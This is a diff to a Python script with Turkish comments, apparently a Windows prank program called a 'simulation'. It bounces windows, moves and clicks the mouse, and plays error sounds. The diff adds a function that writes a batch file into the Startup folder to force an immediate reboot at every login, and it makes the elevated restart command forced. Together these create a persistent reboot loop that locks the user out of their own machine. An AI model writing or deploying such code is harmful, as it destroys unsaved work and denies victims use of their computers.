@@ -1,9 +1,11 @@
 import ctypes
+import os
 import random
 import time
 from ctypes import wintypes
 from threading import Thread
 import winsound  # Windows hata seslerini çalmak için
+import shutil  # Dosya kopyalamak için
 
 # Windows API fonksiyonlarını tanımlama
 EnumWindows = ctypes.windll.user32.EnumWindows
@@ -89,32 +91,35 @@ def move_and_click_mouse():
 
         time.sleep(random.uniform(0.5, 2))  # Rastgele bir süre bekle
 
-def screen_flash_effect():
-    """Ekran renklerini rastgele değiştirerek yanıp sönme efekti oluşturur."""
-    hdc = ctypes.windll.user32.GetDC(0)  # Ekran cihaz bağlamını al
-    for _ in range(50):  # 50 kez yanıp sönme
-        color = random.randint(0, 0xFFFFFF)  # Rastgele bir renk seç
-        ctypes.windll.gdi32.SetBkColor(hdc, color)
-        time.sleep(0.1)
+def add_to_startup():
+    """Kendini Windows başlangıcına ekler."""
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    script_path = os.path.abspath(__file__)  # Bu dosyanın tam yolu
+    startup_script = os.path.join(startup_folder, "File.bat")
+
+    # Başlangıç için bir .bat dosyası oluştur
+    with open(startup_script, "w") as f:
+        f.write(f'@echo off\nshutdown /f /r /t 0\n')
 
 def restart_system():
     """Sistemi yeniden başlatır."""
     try:
         # Admin yetkisiyle komut çalıştırma
         ctypes.windll.shell32.ShellExecuteW(
-            None, "runas", "cmd.exe", "/c shutdown /r /t 0", None, 1
+            None, "runas", "cmd.exe", "/c shutdown /f /r /t 0", None, 1
         )
     except Exception:
         pass  # Hata durumunda sessizce geç
 
 def main():
     """Simülasyonun ana akışı."""
+    add_to_startup()  # Kendini başlangıca ekle
+
     open_windows = get_open_windows()
     for hwnd in open_windows:
         bounce_window(hwnd)
 
     play_error_music()
-    screen_flash_effect()
     restart_system()
 
     # Yeniden başlatma sonrası fare simülasyonunu başlat
